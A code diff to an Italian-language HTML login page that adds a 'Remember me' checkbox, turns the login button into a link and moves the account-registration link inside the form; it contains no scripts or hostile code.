@@ -9,7 +9,7 @@
                 <header>
                     <p class="logoEvent"><img src="Images/logo.png" height="100px" width="300px"></p>
                 </header>
-                <form action="/signin" method="post" class="proceed maskable" name="login" autocomplete="off" novalidate="">
+                <form action="/signin" method="post" class="proceedMaskable" name="login" autocomplete="off" novalidate="">
            
                     <div id="passwordSection" class="clearfix">
                             <div class="fieldEmail">
@@ -18,17 +18,34 @@
                             <div class="fieldPassword">
                                 <input id="password" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" aria-required="true" value="" placeholder="Password">
                             </div>
+                             <div class = "rememberMe">
+                                <input type="checkbox" id="remember_me" name="_remember_me" checked />
+                                <label for="remember_me">Remember me.</label>
+                            </div>
                     </div>
+                    
+                    
                     <div class="accesso">
-                        <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login">Accedi</button>
+                        <a href="" class="access" type="submit" id="btnLogin" name="btnLogin" value="Login">
+                            Accedi
+                        
+                        </a>
                     </div>
+                    
+                    
                     <div class="problemi">
                         <a href="" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Problemi di accesso?</a>
                     </div>
+                    
+                     <div class="registration">
+                        <a href="registration.html" id="createAccount">Crea il tuo account</a>
+                    </div>   
                 </form>
-                <div class="registration">
-                        <a href="" id="createAccount">Registrati gratis</a>
-                </div>
+                
+               
+    
+    
+               
     
         <footer class="footer" role="contentinfo">
                 <p class="footerCopyright">Nessun Copyright registrato. Tutti i diritti non sono riservati.</p>
